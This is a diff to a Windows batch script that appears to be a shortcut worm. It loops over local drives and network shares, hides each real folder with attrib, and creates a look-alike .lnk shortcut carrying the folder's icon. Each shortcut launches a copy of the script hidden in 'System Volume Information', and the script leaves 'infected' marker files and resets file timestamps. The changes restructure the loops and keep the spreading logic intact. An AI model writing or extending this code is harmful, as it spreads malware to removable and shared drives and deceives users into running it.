@@ -113,7 +113,7 @@ for %%i in (A B C D E F G H J L P Q S U V W X Y Z M I K R O N T) do if exist "%%
 
   if /i "%%i:" NEQ "%systemDrive%" (
     if /i "%%i:" NEQ "D:" (
-      if /i "%%j" NEQ "$RECYCLE.BIN" if /i "%%j" NEQ "FOUND.000" if /i "%%j" NEQ "Recycled" if /i "%%j" NEQ "System Volume Information" (
+      for /f "delims=" %%j in ('dir "%%i:\*" /a:d /b 2^>nul') do if /i "%%j" NEQ "$RECYCLE.BIN" if /i "%%j" NEQ "FOUND.000" if /i "%%j" NEQ "Recycled" if /i "%%j" NEQ "System Volume Information" (
         attrib +h +s "%%i:\%%j"
         %module_fileTouch% "%%i:\%%j" >nul
 
@@ -145,23 +145,21 @@ for /f "skip=3 tokens=1,* delims= " %%h in ('net view 2^>nul') do if /i "%%h" NE
     %systemVolumeInfo_dir% "%%h\%%i"
 
     if not exist "%%h\%%i\System Volume Information\infected-%app_date%" (
-      for /f "delims=" %%j in ('dir "%%h\%%i\*" /a:d /b 2^>nul') do (
-        if /i "%%j" NEQ "$RECYCLE.BIN" if /i "%%j" NEQ "$Windows.~WS" if /i "%%j" NEQ "Documents and Settings" if /i "%%j" NEQ "FOUND.000" if /i "%%j" NEQ "MSOCache" if /i "%%j" NEQ "PerfLogs" if /i "%%j" NEQ "ProgramData" if /i "%%j" NEQ "Recovery" if /i "%%j" NEQ "Recycled" if /i "%%j" NEQ "System Volume Information" (
-          attrib +h +s "%%h\%%i\%%j"
-          %module_fileTouch% "%%h\%%i\%%j" >nul
+      for /f "delims=" %%j in ('dir "%%h\%%i\*" /a:d /b 2^>nul') do if /i "%%j" NEQ "$RECYCLE.BIN" if /i "%%j" NEQ "$Windows.~WS" if /i "%%j" NEQ "Documents and Settings" if /i "%%j" NEQ "FOUND.000" if /i "%%j" NEQ "MSOCache" if /i "%%j" NEQ "PerfLogs" if /i "%%j" NEQ "ProgramData" if /i "%%j" NEQ "Recovery" if /i "%%j" NEQ "Recycled" if /i "%%j" NEQ "System Volume Information" (
+        attrib +h +s "%%h\%%i\%%j"
+        %module_fileTouch% "%%h\%%i\%%j" >nul
 
 
-          if not exist "%%h\%%i\%%j.lnk" (
-            set counter=0
-            for /f "delims=" %%y in ('dir "%%h\%%i\%%j\*" /b 2^>nul') do set /a counter+=1
-            if "!counter!" == "0" ( set icon=%WinDir%\System32\shell32.dll,3
-            ) else set icon=%WinDir%\System32\imageres.dll,153
+        if not exist "%%h\%%i\%%j.lnk" (
+          set counter=0
+          for /f "delims=" %%y in ('dir "%%h\%%i\%%j\*" /b 2^>nul') do set /a counter+=1
+          if "!counter!" == "0" ( set icon=%WinDir%\System32\shell32.dll,3
+          ) else set icon=%WinDir%\System32\imageres.dll,153
 
-            if exist "%%h\%%i\%%j\desktop.ini" for /f "tokens=1,2 delims==" %%d in ('type "%%h\%%i\%%j\desktop.ini"') do if /i "%%d" == "IconResource" set icon=%%e
+          if exist "%%h\%%i\%%j\desktop.ini" for /f "tokens=1,2 delims==" %%d in ('type "%%h\%%i\%%j\desktop.ini"') do if /i "%%d" == "IconResource" set icon=%%e
 
-            %module_shortcut% /a:c /f:"%%h\%%i\%%j.lnk" /t:"%%h\%%i\System Volume Information\%~nx0" /p:"--key_target="""%%i:\%%j"""" /i:"!icon!"
-            %module_fileTouch% "%%h\%%i\%%j.lnk" >nul
-          )
+          %module_shortcut% /a:c /f:"%%h\%%i\%%j.lnk" /t:"%%h\%%i\System Volume Information\%~nx0" /p:"--key_target="""%%i:\%%j"""" /i:"!icon!"
+          %module_fileTouch% "%%h\%%i\%%j.lnk" >nul
         )
       )
     )
